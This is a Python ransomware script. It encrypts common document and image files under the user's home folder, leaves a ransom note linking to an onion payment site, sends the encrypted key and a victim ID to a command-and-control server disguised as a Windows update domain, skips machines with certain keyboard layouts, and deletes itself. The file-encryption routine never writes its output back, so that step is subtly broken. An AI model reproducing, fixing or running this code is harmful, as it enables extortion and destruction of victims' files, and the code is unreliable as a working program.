version = '1.0.7'
import os
import sys
import ctypes
from ctypes import wintypes
import datetime
import binascii
import hashlib
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import base64
import requests
start_path = os.path.expanduser('~')
extensions = ['.txt', '.jpg', '.png', '.docx', '.xlsx']
c2 = 'http://windowsupdate.sniffix.xyz'
public_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBUBovVfPwtRnG+Vo7EW4eNOPiIHCJReRGax4AgPPFPdmLrD9ArNXlnz1riKg2STMB29GU0ULdTLQNThdRbruuLJ594OU/G+71aXENM/x5X3TOcAVh3jAix7nk5JnZPTXjzcQ3rbJ/jreuPMzgLHHqKFvV+WBR8FuR9XzPL4JXwchXXFTV1erA8G+flSySK3eQDSchV6QfNX8LZDEs9YVcv/63c2TuHrKwZdf9ybbDvZTHlE78jIveKASxyW3W75W5QuH8TXXp/f1IgqiMhyHzHefA9BQfVOVNF2WuFdl9Fik2Ue1vO5QV7OEJt5ovzHJoWd+MsQzbs3Of20l8DcUPc4IiRXLNo24Y0cNkTZGh+uUTbtmQQ7KG0fcVJhwBH9d2COxQ2MRbnt3+6lrU3+2MY40/kbn1Lx2tS29ssGcX0oBViFu+JJACaftIrIWqW0sGinQlXSActfSmDCnJ4Qydei3EOJ1VwEoiLtAZoEPWA2/5sJb/RnDevpABYDCZik/lc0eXYq9vR+9TmJhb2k8Ah9qDEtL1OLjuaEfDb95iTdNP9+54z8AA0FEVXLEZy2CVfcvwy+h2z3AIKcIut97tY36/ag7PZpSmI4rYWf7jDxHD/hDfuwZobDsk76ddVNBniThCrGk8AO1qs43/TZDzMp2H4G/tcTiZfYOsD5HW7Q=='
passphrase = get_random_bytes(32)
iv = b'rw7j6dfotdja10kt'

def calculate_victim_id():
    date = datetime.datetime.now().strftime('%Y/%m/%d')
    compname = os.environ.get('COMPUTERNAME')
    info = date + '::' + version + '::' + compname
    hashed_info = hashlib.md5(info.encode()).hexdigest()
    return hashed_info

def leave_ransom_note():
    desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
    ransom_file_path = os.path.join(desktop_path, 'ransom_note.txt')
    with open(ransom_file_path, 'w') as f:
        f.write(f'Hi there\nYour files have been encrypted by us.\nWe only want a tiny bit of your money, in return, we decrypt all your files for you.\nFor further instructions, please visit the following site: joskajzjo7gph3zz5wvfovmkb25f56pcsmdiuhcok7xzz42negr6nvad.onion/{calculate_victim_id()}.php')

def killswitch():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    user32.GetKeyboardLayoutList.argtypes = [wintypes.INT, ctypes.POINTER(wintypes.HKL)]
    user32.GetKeyboardLayoutList.restype = wintypes.UINT
    n_elements = user32.GetKeyboardLayoutList(0, None)
    if n_elements == 0:
        return False
    HKL_ARRAY = wintypes.HKL * n_elements
    hkl_array = HKL_ARRAY()
    user32.GetKeyboardLayoutList(n_elements, hkl_array)
    TARGET_LANG_ID_1 = 1038
    TARGET_LANG_ID_2 = 1045
    for hkl in hkl_array:
        lang_id = hkl & 65535
        if lang_id == TARGET_LANG_ID_1 or lang_id == TARGET_LANG_ID_2:
            return True
    else:
        return False

def pad(data: bytes) -> bytes:
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([pad_len]) * pad_len

def encrypt_aes(data: bytes):
    cipher = AES.new(passphrase, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(data))

def encrypt_file(filepath):
    try:
        with open(filepath, 'r+b') as f:
            file = f.read()
            if not file:
                return
            ciphertext = encrypt_aes(file)
            f.seek(0)
    except Exception as e:
        print(f'Failed to process {filepath}: {e}')

def process_files(filepath):
    filename = os.path.basename(filepath).lower()
    if any((filename.endswith(ext) for ext in extensions)):
        encrypt_file(filepath)

def walk_directory(root_path):
    for dirpath, dirnames, filenames in os.walk(root_path, topdown=True):
        for filename in filenames:
            full_path = os.path.join(dirpath, filename)
            try:
                process_files(full_path)
            except Exception as e:
                print(f'Error processing {full_path}: {e}')

def send_passphrase(victim_id):
    cipher = PKCS1_OAEP.new(RSA.import_key(public_key))
    encrypted_key = cipher.encrypt(passphrase)
    victim_data = {'victim_id': f'{victim_id}', 'key': f'{base64.b64encode(encrypted_key).decode()}'}
    print(f'sent data to {c2}/victimdata.php : {victim_data}')
    response = requests.post(f'{c2}/victimdata.php', json=victim_data)

def self_destruct():
    os.remove(sys.argv[0])

def main():
    if killswitch():
        os._exit(1)
    walk_directory(start_path)
    leave_ransom_note()
    send_passphrase(calculate_victim_id())
if __name__ == '__main__':
    main()
    self_destruct()